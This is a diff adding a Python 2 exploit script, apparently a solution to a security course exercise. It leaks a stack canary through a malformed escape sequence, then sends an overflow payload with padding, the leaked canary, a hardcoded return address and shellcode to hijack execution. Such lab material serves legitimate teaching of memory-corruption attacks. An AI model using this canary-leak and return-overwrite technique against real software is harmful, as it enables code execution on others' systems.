@@ -1,0 +1,41 @@
+#!/usr/bin/env python2
+
+from scaffold import *
+
+### YOUR CODE STARTS HERE ###
+
+# send 3 "good" units and one incomplete unit
+p.send('\\x41\\x41\\x41\\x\n')
+
+# this exploit will work unless:
+# 1. the canary contains both \ and x in this order, making the program treat \x and the next 2 chars
+#    as one unit and onl returning one char in their place
+# 2. the canary has a null byte in the first, second or third place.
+rec = p.recvline()
+canary = ""
+
+print "received ", rec, "length = ", len(rec)
+
+if len(rec) < 7:
+    print "Failed, canary has null byte in first, second or third place"
+elif len(rec) == 7:
+    canary = rec[4:7] + '\x00'
+    print "Possible canary is ", canary
+else:
+    canary = rec[4:8]
+    print "Possible canary is ", canary
+
+# fill buffer with null then 15 A's to bypass the loop from 0xbffff7c4 to 0cbffff7d3
+# then put the canary 0xbffff7d4 to 0xbffff7d7
+# then pad with B's till return address 0xbffff7d8 to 0xbffff7df
+# then put return address 0xbffff7e4 at 0xbffff7e0 to 0xbffff7e3
+
+p.send('\x00' + 'A' * 15 + canary + 'B' * 8 + '\xe4\xf7\xff\xbf' + SHELLCODE + '\n')
+
+
+### YOUR CODE  ENDS  HERE ###
+
+returncode = p.end()
+
+if returncode == -11: print "segmentation fault or stack canary!"
+elif returncode != 0: print "return code", returncode
